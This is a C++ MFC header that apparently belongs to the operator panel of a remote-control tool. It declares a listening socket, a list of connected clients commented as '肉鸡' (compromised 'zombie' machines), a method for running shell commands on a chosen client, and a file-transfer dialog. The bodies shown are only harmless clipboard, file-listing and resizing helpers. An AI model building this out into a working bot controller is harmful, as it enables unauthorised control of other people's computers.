
// hisfooDlg.h : 头文件
//

#pragma once
#include "Ccmdline.h"
#include "../hisfans/ykdef.h"
#include "afxwin.h"
#include <map>
#include "moreopt.h"
#include "filepcs.h"
class ChisfooDlgAutoProxy;
class Ccmdline;
class moreopt;
class filepcs;

// ChisfooDlg 对话框
class ChisfooDlg : public CDialogEx
{
	DECLARE_DYNAMIC(ChisfooDlg);
	friend class ChisfooDlgAutoProxy;
public:
	typedef int BOOL;
	typedef unsigned char byte;
	class CLData
	{
	public:
		unsigned long long Method;
		list<shared_ptr<byte>> Data;
	};
	map<unsigned long long, list<CLData>>WorkMap;
	BOOL Work_Pcs(SOCKET iSock, unsigned long long UID);

	class UserData
	{
	public:
		chrono::system_clock::time_point _Last_Time;
		unsigned long long CID;
	};

	BOOL CopyToClipboard(string pszData, unsigned long long nDataLen)
	{
		if (::OpenClipboard(NULL))
		{
			::EmptyClipboard();
			HGLOBAL clipbuffer;
			char* buffer;
			clipbuffer = ::GlobalAlloc(GMEM_DDESHARE, nDataLen);
			buffer = (char *)::GlobalLock(clipbuffer);
			memcpy(buffer, pszData.c_str(), nDataLen);
			::GlobalUnlock(clipbuffer);
			::SetClipboardData(CF_TEXT, clipbuffer);
			::CloseClipboard();
			return TRUE;
		}
		return FALSE;
	}

public:
	SOCKET slisten;
	atomic_short Listen_Port = S_Port;
	timed_mutex _NetLock;
	atomic_uint _Thr_Flag = 0U;
	atomic_uint Pcs_Flag = 1U;
	unsigned long long _Cli_Count = 1ULL;
	list<thread> _Thr_Pcs;
	void NetWork_Pcs();
	void Offline_Pcs();
	list<CLData> Task_Pcs;
	list<UserData>userList;
	shared_ptr<Ccmdline> tbox;
	shared_ptr<unsigned int> _Shell_Call;
	shared_ptr<filepcs> _file_trs_dlg;
	void _VFUNC(unsigned long long CID);
	void _GoShell(unsigned long long CID, string Shell);
	void MessagePcs(string Msg);
	void UserOperate(unsigned long long UserID, unsigned long long Mode);
	void UserOperate(unsigned long long UserID, unsigned long long Mode, sockaddr_in& sCli);
// 构造
public:
	ChisfooDlg(CWnd* pParent = NULL);	// 标准构造函数
	virtual ~ChisfooDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_HISFOO_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持

public:
	//获取特定格式的文件名  
	void GetAllFormatFiles(string path, vector<string>& files, string format)
	{
		//文件句柄    
		long   hFile = 0;
		//文件信息    
		struct _finddata_t fileinfo;
		string p;
		if ((hFile = _findfirst(p.assign(path).append("\\*" + format).c_str(), &fileinfo)) != -1)
		{
			do
			{
				if ((fileinfo.attrib &  _A_SUBDIR))
				{
					if (strcmp(fileinfo.name, ".") != 0 && strcmp(fileinfo.name, "..") != 0)
					{
						files.push_back(p.assign(path).append("\\").append(fileinfo.name) );  
						GetAllFormatFiles(p.assign(path).append("\\").append(fileinfo.name), files, format);
					}
				}
				else
				{
					files.push_back(p.assign(path).append("\\").append(fileinfo.name));
				}
			} while (_findnext(hFile, &fileinfo) == 0);

			_findclose(hFile);
		}
	}
// 实现
protected:
	ChisfooDlgAutoProxy* m_pAutoProxy;
	HICON m_hIcon;

	BOOL CanExit();

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	afx_msg void OnClose();
	virtual void OnOK();
	virtual void OnCancel();
	DECLARE_MESSAGE_MAP()
public:
	// 肉鸡列表
	CListBox puserlist;
	// 信息与提醒
	CListBox pmsgbox;
	afx_msg void OnBnClickedButton3();
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedCancel();

	POINT old;    //保存原屏幕客户区大小，调整窗口大小用  
				  //调整窗口大小与桌面工作区相同
	void AdjustWindowsSize(void)
	{
		CRect rect;
		GetClientRect(&rect);     //取客户区大小    
		old.x = rect.right - rect.left;
		old.y = rect.bottom - rect.top;
		int cx = GetSystemMetrics(SM_CXFULLSCREEN);
		int cy = GetSystemMetrics(SM_CYFULLSCREEN);
		CRect rt;
		SystemParametersInfo(SPI_GETWORKAREA, 0, &rt, 0);  //获得桌面工作区大小，即不包括任务栏的大小
		cy = rt.bottom;
		MoveWindow(0, 0, cx, cy);
	}

	//调整当前窗口中所有控件大小，以适应当前屏幕分辨率
	void ReSize(void)
	{
		float fsp[2];
		POINT Newp; //获取现在对话框的大小  
		CRect recta;
		GetClientRect(&recta);     //取客户区大小    
		Newp.x = recta.right - recta.left;
		Newp.y = recta.bottom - recta.top;
		fsp[0] = (float)Newp.x / old.x;
		fsp[1] = (float)Newp.y / old.y;
		CRect Rect;
		int woc;
		CPoint OldTLPoint, TLPoint; //左上角  
		CPoint OldBRPoint, BRPoint; //右下角  
		HWND  hwndChild = ::GetWindow(m_hWnd, GW_CHILD);  //列出所有控件    
		while (hwndChild)
		{
			woc = ::GetDlgCtrlID(hwndChild);//取得ID  
			GetDlgItem(woc)->GetWindowRect(Rect);
			ScreenToClient(Rect);
			OldTLPoint = Rect.TopLeft();
			TLPoint.x = long(OldTLPoint.x*fsp[0]);
			TLPoint.y = long(OldTLPoint.y*fsp[1]);
			OldBRPoint = Rect.BottomRight();
			BRPoint.x = long(OldBRPoint.x *fsp[0]);
			BRPoint.y = long(OldBRPoint.y *fsp[1]);
			Rect.SetRect(TLPoint, BRPoint);
			GetDlgItem(woc)->MoveWindow(Rect, TRUE);
			hwndChild = ::GetWindow(hwndChild, GW_HWNDNEXT);
		}
		old = Newp;
	}
	afx_msg void OnBnClickedButton4();
};
